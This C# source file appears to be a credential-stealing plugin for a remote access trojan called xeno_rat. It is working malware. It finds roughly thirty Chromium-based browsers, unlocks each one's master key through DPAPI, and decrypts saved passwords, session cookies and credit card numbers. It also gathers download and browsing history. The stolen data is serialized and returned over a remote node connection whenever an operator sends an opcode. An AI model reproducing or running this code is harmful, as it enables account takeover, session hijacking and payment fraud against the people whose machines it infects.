using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using System.Web.Script.Serialization;
using System.Threading.Tasks;
using xeno_rat_client;
using System.Runtime.Serialization.Formatters.Binary;
using InfoGrab;

namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Serializes a list of Chromium logins into a byte array.
        /// </summary>
        /// <param name="loginList">The list of Chromium logins to be serialized.</param>
        /// <returns>A byte array containing the serialized Chromium logins.</returns>
        /// <remarks>
        /// This method serializes the input list of Chromium logins into a byte array using a BinaryWriter and MemoryStream.
        /// It first writes the count of logins, then iterates through each login and writes its URL, username, and password to the binary stream.
        /// The method then returns the resulting byte array.
        /// </remarks>
        public static byte[] SerializeLoginList(List<Chromium.Login> loginList)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                writer.Write(loginList.Count);
                foreach (Chromium.Login login in loginList)
                {
                    writer.Write(login.url);
                    writer.Write(login.username);
                    writer.Write(login.password);
                }
                return memoryStream.ToArray();
            }
        }

        /// <summary>
        /// Serializes a list of Chromium cookies into a byte array.
        /// </summary>
        /// <param name="cookieList">The list of Chromium cookies to be serialized.</param>
        /// <returns>A byte array containing the serialized data of the input <paramref name="cookieList"/>.</returns>
        /// <remarks>
        /// This method serializes the input list of Chromium cookies into a byte array using a <see cref="MemoryStream"/> and a <see cref="BinaryWriter"/>.
        /// It writes the count of cookies followed by the host, name, path, value, and expiration date for each cookie in the list.
        /// The serialized data is then returned as a byte array.
        /// </remarks>
        public static byte[] SerializeCookieList(List<Chromium.Cookie> cookieList)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                writer.Write(cookieList.Count);
                foreach (Chromium.Cookie cookie in cookieList)
                {
                    writer.Write(cookie.host);
                    writer.Write(cookie.name);
                    writer.Write(cookie.path);
                    writer.Write(cookie.value);
                    writer.Write(cookie.expires);
                }
                return memoryStream.ToArray();
            }
        }

        /// <summary>
        /// Serializes a list of web history items into a byte array.
        /// </summary>
        /// <param name="historyList">The list of web history items to be serialized.</param>
        /// <returns>A byte array containing the serialized web history items.</returns>
        /// <remarks>
        /// This method serializes the input list of web history items into a byte array using the BinaryWriter and MemoryStream classes.
        /// It first writes the count of history items, then iterates through each history item and writes its URL, title, and timestamp.
        /// The method returns the resulting byte array.
        /// </remarks>
        public static byte[] SerializeWebHistoryList(List<Chromium.WebHistory> historyList)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                writer.Write(historyList.Count);
                foreach (Chromium.WebHistory history in historyList)
                {
                    writer.Write(history.url);
                    writer.Write(history.title);
                    writer.Write(history.timestamp);
                }
                return memoryStream.ToArray();
            }
        }

        /// <summary>
        /// Serializes a list of Chromium downloads into a byte array.
        /// </summary>
        /// <param name="downloadList">The list of Chromium downloads to be serialized.</param>
        /// <returns>A byte array containing the serialized download list.</returns>
        /// <remarks>
        /// This method serializes the input list of Chromium downloads into a byte array using the BinaryWriter and MemoryStream classes.
        /// It first writes the count of downloads in the list and then iterates through each download, writing its tab URL and target path to the memory stream.
        /// The resulting byte array represents the serialized form of the download list and is returned as the output.
        /// </remarks>
        public static byte[] SerializeDownloadList(List<Chromium.Download> downloadList)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                writer.Write(downloadList.Count);
                foreach (Chromium.Download download in downloadList)
                {
                    writer.Write(download.tab_url);
                    writer.Write(download.target_path);
                }
                return memoryStream.ToArray();
            }
        }

        /// <summary>
        /// Serializes a list of credit cards into a byte array.
        /// </summary>
        /// <param name="creditCardList">The list of credit cards to be serialized.</param>
        /// <returns>A byte array representing the serialized credit card list.</returns>
        /// <remarks>
        /// This method serializes the input list of credit cards into a byte array using the BinaryWriter and MemoryStream classes.
        /// It writes the count of credit cards followed by the details of each credit card including name, month, year, number, and date modified.
        /// The serialized byte array is then returned.
        /// </remarks>
        public static byte[] SerializeCreditCardList(List<Chromium.CreditCard> creditCardList)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                writer.Write(creditCardList.Count);
                foreach (Chromium.CreditCard creditCard in creditCardList)
                {
                    writer.Write(creditCard.name);
                    writer.Write(creditCard.month);
                    writer.Write(creditCard.year);
                    writer.Write(creditCard.number);
                    writer.Write(creditCard.date_modified);
                }
                return memoryStream.ToArray();
            }
        }

        /// <summary>
        /// Asynchronously runs the specified node and performs various operations based on the received opcode.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="node"/> is null.</exception>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected to the specified <paramref name="node"/>.
        /// It then creates a new Chromium instance and enters a loop to continuously check for incoming data from the <paramref name="node"/>.
        /// Upon receiving data, it checks the opcode and performs different operations based on the received value:
        /// - If the opcode is 0, it retrieves login data from the Chromium instance and serializes it into a byte array.
        /// - If the opcode is 1, it retrieves cookie data from the Chromium instance and serializes it into a byte array.
        /// - If the opcode is 2, it retrieves credit card data from the Chromium instance and serializes it into a byte array.
        /// - If the opcode is 3, it retrieves download data from the Chromium instance and serializes it into a byte array.
        /// - If the opcode is 4, it retrieves web history data from the Chromium instance and serializes it into a byte array.
        /// If no payload is generated based on the received opcode, the method disconnects from the <paramref name="node"/> and returns.
        /// The method continues to send the generated payload back to the <paramref name="node"/> until the connection is maintained.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            Chromium chromium = new Chromium();
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    GC.Collect();
                    return;
                }
                int opcode = data[0];
                byte[] payload = null;
                if (opcode == 0)//passwords 
                {
                    List<Chromium.Login> loginData = await chromium.GetLoginData();
                    Console.WriteLine(loginData.Count);
                    payload = SerializeLoginList(loginData);
                }
                else if (opcode == 1)//cookies 
                {
                    List<Chromium.Cookie> cookieData = await chromium.GetCookies();
                    payload = SerializeCookieList(cookieData);
                }
                else if (opcode == 2)//cc's
                {
                    List<Chromium.CreditCard> cardData = await chromium.GetCreditCards();
                    payload = SerializeCreditCardList(cardData);
                }
                else if (opcode == 3)//downloads
                {
                    List<Chromium.Download> downloadData = await chromium.GetDownloads();
                    payload = SerializeDownloadList(downloadData);
                }
                else if (opcode == 4)//history
                {
                    List<Chromium.WebHistory> historyData = await chromium.GetWebHistory();
                    payload = SerializeWebHistoryList(historyData);
                }
                
                if (payload == null) 
                {
                    node.Disconnect();
                    return;
                }
                await node.SendAsync(payload);
            }
        }
    }

    public class Chromium
    {
        private static string local_appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
        private static string roaming_appdata = Environment.GetEnvironmentVariable("APPDATA");

        public static Dictionary<string, string> browsers = new Dictionary<string, string>
        {
            { "amigo", $"{local_appdata}\\Amigo\\User Data" },
            { "torch", $"{local_appdata}\\Torch\\User Data" },
            { "kometa", $"{local_appdata}\\Kometa\\User Data" },
            { "orbitum", $"{local_appdata}\\Orbitum\\User Data" },
            { "cent-browser", $"{local_appdata}\\CentBrowser\\User Data" },
            { "7star", $"{local_appdata}\\7Star\\7Star\\User Data" },
            { "sputnik", $"{local_appdata}\\Sputnik\\Sputnik\\User Data" },
            { "vivaldi", $"{local_appdata}\\Vivaldi\\User Data" },
            { "google-chrome-sxs", $"{local_appdata}\\Google\\Chrome SxS\\User Data" },
            { "google-chrome", $"{local_appdata}\\Google\\Chrome\\User Data" },
            { "epic-privacy-browser", $"{local_appdata}\\Epic Privacy Browser\\User Data" },
            { "microsoft-edge", $"{local_appdata}\\Microsoft\\Edge\\User Data" },
            { "uran", $"{local_appdata}\\uCozMedia\\Uran\\User Data" },
            { "yandex", $"{local_appdata}\\Yandex\\YandexBrowser\\User Data" },
            { "brave", $"{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data" },
            { "iridium", $"{local_appdata}\\Iridium\\User Data" },
            { "chromium", $"{local_appdata}\\Chromium\\User Data" },
            { "qqbrowser", $"{local_appdata}\\Tencent\\QQBrowser\\User Data" },
            { "chromeplus", $"{local_appdata}\\ChromePlus\\User Data" },
            { "chedot", $"{local_appdata}\\Chedot\\User Data" },
            { "coowon", $"{local_appdata}\\Coowon\\User Data" },
            { "liebao", $"{local_appdata}\\Cheetah Mobile\\Liebao Browser\\User Data" },
            { "qip-surf", $"{local_appdata}\\QIP\\Surf\\User Data" },
            { "comodo", $"{local_appdata}\\Comodo\\Dragon\\User Data" },
            { "360browser", $"{local_appdata}\\360SE\\User Data" },
            { "maxthon3", $"{local_appdata}\\Maxthon3\\User Data" },
            { "coccoc", $"{local_appdata}\\CocCoc\\Browser\\User Data" },
            { "chromodo", $"{local_appdata}\\Comodo\\Chromodo\\User Data" },
            { "blackhawk", $"{local_appdata}\\Netgate\\BlackHawk\\User Data" },

            { "opera", $"{roaming_appdata}\\Opera Software\\Opera Stable" },
            { "opera-gx", $"{roaming_appdata}\\Opera Software\\Opera GX Stable" }
        };

        private string[] profiles = {
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5"
    };

        /// <summary>
        /// Retrieves the master key from the specified file path and returns it after decryption.
        /// </summary>
        /// <param name="path">The file path from which to retrieve the master key.</param>
        /// <returns>The decrypted master key retrieved from the file.</returns>
        /// <exception cref="FileNotFoundException">Thrown when the specified file does not exist.</exception>
        /// <exception cref="KeyNotFoundException">Thrown when the 'os_crypt' key is not found in the JSON content.</exception>
        /// <remarks>
        /// This method reads the content of the file located at the specified <paramref name="path"/>.
        /// It then deserializes the JSON content using a JavaScriptSerializer and retrieves the encrypted key.
        /// The encrypted key is then decrypted using ProtectedData.Unprotect method and returned as the master key.
        /// </remarks>
        private static byte[] GetMasterKey(string path)
        {
            if (!File.Exists(path))
                return null;

            string content = File.ReadAllText(path);
            if (!content.Contains("os_crypt"))
                return null;

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            dynamic jsonObject = serializer.Deserialize<dynamic>(content);

            if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
            {
                string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));

                return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
            }
            return null;
        }

        /// <summary>
        /// Decrypts the password using the provided buffer and master key.
        /// </summary>
        /// <param name="buffer">The buffer containing the encrypted password.</param>
        /// <param name="masterKey">The master key used for decryption.</param>
        /// <returns>The decrypted password as a string.</returns>
        /// <remarks>
        /// This method decrypts the password using the provided buffer and master key.
        /// It initializes a GCM block cipher with an AES engine and decrypts the payload using the provided initialization vector (IV) and master key.
        /// The decrypted password is then returned as a string.
        /// If an exception occurs during the decryption process, null is returned.
        /// </remarks>
        private string DecryptPassword(byte[] buffer, byte[] masterKey)
        {
            try
            {
                byte[] iv = new byte[12];
                Buffer.BlockCopy(buffer, 3, iv, 0, iv.Length);
                byte[] payload = new byte[buffer.Length - 15];
                Buffer.BlockCopy(buffer, 15, payload, 0, payload.Length);

                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                cipher.Init(false, new AeadParameters(new KeyParameter(masterKey), 128, iv));
                byte[] decryptedPass = new byte[cipher.GetOutputSize(payload.Length)];
                int len = cipher.ProcessBytes(payload, 0, payload.Length, decryptedPass, 0);
                cipher.DoFinal(decryptedPass, len);
                return Encoding.Default.GetString(decryptedPass);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Retrieves login data from the specified path using the provided master key for decryption.
        /// </summary>
        /// <param name="path">The path where the login data is stored.</param>
        /// <param name="masterKey">The master key used for decryption.</param>
        /// <returns>A list of Login objects containing the retrieved login data.</returns>
        /// <remarks>
        /// This method asynchronously retrieves login data from the specified path using the provided master key for decryption.
        /// If the login data file does not exist at the specified path, null is returned.
        /// The method creates a temporary copy of the login data file, reads the table "logins" using SQLiteHandler, and populates the list of Login objects with the retrieved data.
        /// If an exception occurs during the retrieval process, null is returned.
        /// </remarks>
        /// <exception cref="Exception">Thrown if an error occurs during the retrieval process.</exception>
        public async Task<List<Login>> GetLoginData()
        {
            List<Login> loginList = new List<Login>();
            foreach (var browser in browsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Login> loginData = await GetLoginData(profilePath, masterKey);
                        if (loginData == null) continue;
                        loginList.AddRange(loginData);
                    }
                    catch
                    {
                    }
                }
            }
            return loginList;
        }

        /// <summary>
        /// Retrieves cookies from the specified path using the provided master key and returns a list of cookies.
        /// </summary>
        /// <param name="path">The path where the cookie database is located.</param>
        /// <param name="masterKey">The master key used for decrypting the cookies.</param>
        /// <returns>A list of cookies retrieved from the specified <paramref name="path"/> using the provided <paramref name="masterKey"/>.</returns>
        /// <remarks>
        /// This method asynchronously retrieves cookies from the specified <paramref name="path"/> by decrypting the cookie database using the provided <paramref name="masterKey"/>.
        /// It then populates a list of cookies with the retrieved data and returns the list.
        /// If the cookie database does not exist at the specified <paramref name="path"/>, or if an exception occurs during the retrieval process, null is returned.
        /// </remarks>
        /// <exception cref="Exception">Thrown if an error occurs during the retrieval process.</exception>
        public async Task<List<Cookie>> GetCookies()
        {
            List<Cookie> cookieList = new List<Cookie>();
            foreach (var browser in browsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Cookie> cookieData = await GetCookies(profilePath, masterKey);
                        cookieList.AddRange(cookieData);
                    }
                    catch
                    {
                    }
                }
            }
            return cookieList;
        }

        /// <summary>
        /// Retrieves web history from the specified path and returns a list of WebHistory objects.
        /// </summary>
        /// <param name="path">The path where the web history is stored.</param>
        /// <returns>A list of WebHistory objects representing the web history from the specified path.</returns>
        /// <remarks>
        /// This method retrieves web history from the specified path by accessing the history database file.
        /// It creates a temporary copy of the database file, reads the "urls" table using SQLiteHandler, and populates the history list with WebHistory objects.
        /// If any required data is missing or if an exception occurs during the process, the method returns null.
        /// </remarks>
        /// <exception cref="Exception">Thrown if an error occurs during the retrieval of web history.</exception>
        public async Task<List<WebHistory>> GetWebHistory()
        {
            List<WebHistory> webHistoryList = new List<WebHistory>();
            foreach (var browser in browsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<WebHistory> webHistoryData = await GetWebHistory(profilePath);
                        webHistoryList.AddRange(webHistoryData);
                    }
                    catch { }
                }
            }
            return webHistoryList;
        }

        /// <summary>
        /// Retrieves the list of downloads from the specified path.
        /// </summary>
        /// <param name="path">The path where the downloads are stored.</param>
        /// <returns>A list of Download objects representing the downloaded items.</returns>
        /// <remarks>
        /// This method retrieves the list of downloads from the specified path by reading the downloads database file.
        /// If the database file does not exist, the method returns null.
        /// The method then creates a temporary copy of the database file and establishes a connection to it using SQLiteHandler.
        /// It reads the "downloads" table from the database and populates the list of Download objects based on the retrieved data.
        /// If any exceptions occur during this process, the method returns null.
        /// Finally, the temporary database file is deleted before returning the list of downloads.
        /// </remarks>
        /// <exception cref="Exception">Thrown if any error occurs during the retrieval process.</exception>
        public async Task<List<Download>> GetDownloads()
        {
            List<Download> downloadsList = new List<Download>();
            foreach (var browser in browsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Download> downloadsData = await GetDownloads(profilePath);
                        downloadsList.AddRange(downloadsData);
                    }
                    catch { }
                }
            }
            return downloadsList;
        }

        /// <summary>
        /// Retrieves credit card information from the specified path using the provided master key for decryption.
        /// </summary>
        /// <param name="path">The path where the credit card information is stored.</param>
        /// <param name="masterKey">The master key used for decrypting the credit card information.</param>
        /// <returns>A list of CreditCard objects containing the retrieved credit card information.</returns>
        /// <remarks>
        /// This method retrieves credit card information from the specified path by decrypting the data using the provided master key.
        /// It first checks if the database file exists at the specified path, and if not, returns null.
        /// It then creates a temporary copy of the database file, reads the credit card information using SQLite, decrypts the card numbers using the master key, and populates a list of CreditCard objects with the retrieved information.
        /// If any exception occurs during the process, the method returns null.
        /// </remarks>
        /// <exception cref="Exception">Thrown if any error occurs during the retrieval and decryption of credit card information.</exception>
        public async Task<List<CreditCard>> GetCreditCards()
        {
            List<CreditCard> creditCardsList = new List<CreditCard>();
            foreach (var browser in browsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<CreditCard> creditCardsData = await GetCreditCards(profilePath, masterKey);
                        creditCardsList.AddRange(creditCardsData);
                    }
                    catch { }
                }
            }
            return creditCardsList;
        }
        private async Task<List<Login>> GetLoginData(string path, byte[] masterKey)
        {
            string loginDbPath = Path.Combine(path, "Login Data");
            if (!File.Exists(loginDbPath))
                return null;

            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(loginDbPath, tempDbPath, true);
            List<Login> logins = new List<Login>();

            try
            {
                await Task.Run(() =>
                {
                    SQLiteHandler conn = new SQLiteHandler(tempDbPath);
                    if (!conn.ReadTable("logins"))
                    {
                        logins = null;
                        return;
                    }

                    for (int i = 0; i < conn.GetRowCount(); i++)
                    {
                        string password = conn.GetValue(i, "password_value");
                        string username = conn.GetValue(i, "username_value");
                        string url = conn.GetValue(i, "action_url");

                        if (password == null || username == null || url == null) continue;

                        password = DecryptPassword(Encoding.Default.GetBytes(password), masterKey);
                        if (password == "" && username == "")
                        {
                            continue;
                        }
                        logins.Add(new Login(url, username, password));
                    }
                });
            }
            catch
            {
                logins = null;
            }

            File.Delete(tempDbPath);
            return logins;
        }


        private async Task<List<Cookie>> GetCookies(string path, byte[] masterKey)
        {
            string cookieDbPath = Path.Combine(path, "Network", "Cookies");
            if (!File.Exists(cookieDbPath))
                return null;
            List<Cookie> cookies = new List<Cookie>();
            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(cookieDbPath, tempDbPath, true);

            try
            {
                await Task.Run(() =>
                {
                    SQLiteHandler conn = new SQLiteHandler(tempDbPath);
                    if (!conn.ReadTable("cookies"))
                    {
                        cookies = null;
                        return;
                    }

                    for (int i = 0; i < conn.GetRowCount(); i++)
                    {
                        string host = conn.GetValue(i, "host_key");
                        string name = conn.GetValue(i, "name");
                        string url_path = conn.GetValue(i, "path");
                        string decryptedCookie = conn.GetValue(i, "encrypted_value");
                        string expires_string = conn.GetValue(i, "expires_utc");

                        if (host == null || name == null || url_path == null || decryptedCookie == null || expires_string == null || expires_string == "") continue;

                        long expires_utc = long.Parse(expires_string);
                        decryptedCookie = DecryptPassword(Encoding.Default.GetBytes(decryptedCookie), masterKey);
                        if (decryptedCookie == "" || decryptedCookie == null)
                        {
                            continue;
                        }
                        cookies.Add(new Cookie(
                            host,
                            name,
                            url_path,
                            decryptedCookie,
                            expires_utc
                        ));
                    }
                });
            }
            catch (Exception)
            {
                cookies = null;
            }

            File.Delete(tempDbPath);
            return cookies;
        }

        private async Task<List<WebHistory>> GetWebHistory(string path)
        {
            string historyDbPath = Path.Combine(path, "History");
            if (!File.Exists(historyDbPath))
                return null;

            List<WebHistory> history = new List<WebHistory>();

            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(historyDbPath, tempDbPath, true);

            try
            {
                await Task.Run(() =>
                {
                    SQLiteHandler conn = new SQLiteHandler(tempDbPath);
                    if (!conn.ReadTable("urls"))
                    {
                        history = null;
                        return;
                    }

                    for (int i = 0; i < conn.GetRowCount(); i++)
                    {
                        string url = conn.GetValue(i, "url");
                        string title = conn.GetValue(i, "title");
                        string last_visit_time_string = conn.GetValue(i, "last_visit_time");
                        if (url == "" || url == null || title == null || last_visit_time_string == null || last_visit_time_string == "")
                        {
                            continue;
                        }
                        long last_visit_time = long.Parse(last_visit_time_string);
                        history.Add(new WebHistory(
                            url,
                            title,
                            last_visit_time
                        ));
                    }
                });
            }
            catch (Exception)
            {
                history = null;
            }
            File.Delete(tempDbPath);
            return history;
        }

        private async Task<List<Download>> GetDownloads(string path)
        {
            string downloadsDbPath = Path.Combine(path, "History");
            if (!File.Exists(downloadsDbPath))
                return null;

            List<Download> downloads = new List<Download>();

            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(downloadsDbPath, tempDbPath, true);

            try
            {
                await Task.Run(() =>
                {
                    SQLiteHandler conn = new SQLiteHandler(tempDbPath);
                    if (!conn.ReadTable("downloads"))
                    {
                        downloads = null;
                        return;
                    }

                    for (int i = 0; i < conn.GetRowCount(); i++)
                    {

                        string target_path = conn.GetValue(i, "target_path");
                        string tab_url = conn.GetValue(i, "tab_url");
                        if (target_path == null || target_path == "" || tab_url == null)
                        {
                            continue;
                        }
                        downloads.Add(new Download(
                            tab_url,
                            target_path
                        ));
                    }
                });
            }
            catch (Exception)
            {
                downloads = null;
            }

            File.Delete(tempDbPath);
            return downloads;
        }

        private async Task<List<CreditCard>> GetCreditCards(string path, byte[] masterKey)
        {
            string cardsDbPath = Path.Combine(path, "Web Data");
            if (!File.Exists(cardsDbPath))
                return null;
            List<CreditCard> cards = new List<CreditCard>();
            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(cardsDbPath, tempDbPath, true);

            try
            {
                await Task.Run(() =>
                {
                    SQLiteHandler conn = new SQLiteHandler(tempDbPath);
                    if (!conn.ReadTable("credit_cards"))
                    {
                        cards = null;
                        return;
                    }

                    for (int i = 0; i < conn.GetRowCount(); i++)
                    {
                        string name_on_card = conn.GetValue(i, "name_on_card");
                        string expiration_month = conn.GetValue(i, "expiration_month");
                        string expiration_year = conn.GetValue(i, "expiration_year");
                        string cardNumber = conn.GetValue(i, "card_number_encrypted");
                        string date_modified_string = conn.GetValue(i, "date_modified");
                        if (name_on_card == null || expiration_month == null || expiration_year == null || cardNumber == null || cardNumber == "" || date_modified_string == null) continue;

                        cardNumber = DecryptPassword(Encoding.Default.GetBytes(cardNumber), masterKey);
                        long date_modified = long.Parse(date_modified_string);
                        cards.Add(new CreditCard(
                            name_on_card,
                            expiration_month,
                            expiration_year,
                            cardNumber,
                            date_modified
                        ));
                    }
                });
            }
            catch (Exception)
            {
                cards = null;
            }

            File.Delete(tempDbPath);
            return cards;
        }

        public class Login
        {
            public Login(string url, string username, string password)
            {
                this.url = url;
                this.username = username;
                this.password = password;
            }

            public string url { get; set; }
            public string username { get; set; }
            public string password { get; set; }
        }

        public class Cookie
        {
            public Cookie(string host, string name, string path, string value, long expires)
            {
                this.host = host;
                this.name = name;
                this.path = path;
                this.value = value;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                long unixExpires = (expires / 1000000) - 11644473600;
                if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                {
                    unixExpires = maxUnixTimestamp-1;
                }
                this.expires = unixExpires;
            }

            public string host { get; set; }
            public string name { get; set; }
            public string path { get; set; }
            public string value { get; set; }
            public long expires { get; set; }
        }

        public class WebHistory
        {
            public WebHistory(string url, string title, long timestamp)
            {
                this.url = url;
                this.title = title;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                long unixExpires = (timestamp / 1000000) - 11644473600;
                if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                {
                    unixExpires = maxUnixTimestamp - 1;
                }
                this.timestamp = unixExpires;
            }

            public string url { get; set; }
            public string title { get; set; }
            public long timestamp { get; set; }
        }

        public class Download
        {
            public Download(string tab_url, string target_path)
            {
                this.tab_url = tab_url;
                this.target_path = target_path;
            }

            public string tab_url { get; set; }
            public string target_path { get; set; }
        }

        public class CreditCard
        {
            public CreditCard(string name, string month, string year, string number, long date_modified)
            {
                this.name = name;
                this.month = month;
                this.year = year;
                this.number = number;
                this.date_modified = date_modified;
            }

            public string name { get; set; }
            public string month { get; set; }
            public string year { get; set; }
            public string number { get; set; }
            public long date_modified { get; set; }
        }
    }

}
